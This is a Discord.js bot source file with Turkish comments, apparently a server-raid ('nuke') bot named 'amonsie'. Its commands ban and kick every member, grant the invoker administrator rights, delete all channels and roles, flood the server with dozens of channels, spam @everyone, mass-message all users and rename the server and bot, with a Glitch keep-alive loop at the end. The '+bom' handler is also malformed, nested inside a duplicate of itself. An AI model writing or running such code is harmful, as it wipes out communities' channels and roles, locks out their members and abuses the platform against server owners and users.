const Discord = require("discord.js"); 
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);

client.on("message", msg => {           
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());  
  }
});       ///BAN KOMUTU SUNUCUDAKI HEKESI BANLAR +ban

client.on('message', msg => {           
  // Mesajın bot tarafından mı gönderildiğini ve komutun içeriğini kontrol et   
  if (!msg.author.bot && msg.content.toLowerCase() === '+leave') {
    msg.delete(); // sizin mesajınızı siler
    msg.guild.leave(); // Sunucudan ayrılır
  }
});       ///Sunucudan kaçar.

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});      ///KICK KOMUTU SUNUCUDAKI HERKESI KICKLER +kick 

client.on("message", async msg => {
  if (msg.content === "+amonzie") {  //SUNUCUDAKI BUTUN HERKESE MESAJ GÖNDERİR +duyur
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "**amonsie** :wink:"  //HERKESE DMDEN ATILAN MESAJ
        )
      )
      .catch(console.error);
  } 
});

client.on("message", msg => {
  if (msg.content === "+perm") {  //SIZE YÖNETICI YETKISI VERIR +yetki KOMUTU 2 KERE YAZMANIZ GEREK.
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  
    msg.member.addRole(rol);
  }
});

client.on("message", async msg => {
  if (msg.content === "+bom") {     ///yardım KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    msg.delete();

client.on("message", async msg => {
  if (msg.content === "+bom") {     
    msg.delete();

    await msg.guild.channels.deleteAll();      

    await msg.guild.createChannel("amonsie", {
      type: "text"
    });
      await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
        await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", { 
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
            await msg.guild
      .createChannel("amonsie", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    
    await msg.guild.setIcon("https://hizliresim.com/kzcgv6x");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("ャ amonsie ャ"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await client.user.setAvatar("https://hizliresim.com/kzcgv6x"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("ャ amonsie ャ");    //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send("**amonsie**");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
    
  }   
});



    client.on("message", msg => {
  if (msg.content === "+rolac") {  
    msg.delete();
    msg.guild.createRole({
      name: "amonsie",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
        msg.guild.createRole({
      name: "amonsie",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
            msg.guild.createRole({
      name: "amonsie",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "amonsie",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"] 
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "E000FF",  
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "amonsie",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
  }
});

client.on('message', msg => {
  if (msg.content === '+spam') { 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 
        msg.channel.send('**__amonsie__** @everyone :wink:');  
        msg.channel.send('**__amonsie__** @everyone :wink:'); 

  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);








client.on('messageCreate', (message) => {
  if (message.author.bot) return;


});


client.once('ready', () => {
  console.log(`Bot ${client.user.tag} olarak giriş yaptı.`);

  // Botun oynuyor durumunu ayarla
  client.user.setActivity('Annenle', { type: 'PLAYING' })
    .then(presence => console.log(`Oynuyor durumu "${presence.activities[0].name}" olarak ayarlandı.`))
    .catch(error => console.error("Oynuyor durumu ayarlanırken bir hata oluştu:", error));
});


client.on('messageCreate', (message) => {
  if (message.author.bot) return;


});

client.once('ready', () => {
  console.log(`Bot ${client.user.tag} olarak giriş yaptı.`);

 
  client.user.setPresence({
    status: 'idle'
  }).then(() => console.log('Ayarladığınız durumuna geçildi.'))
    .catch(error => console.error("Botun durumu ayarlanırken bir hata oluştu:", error));
});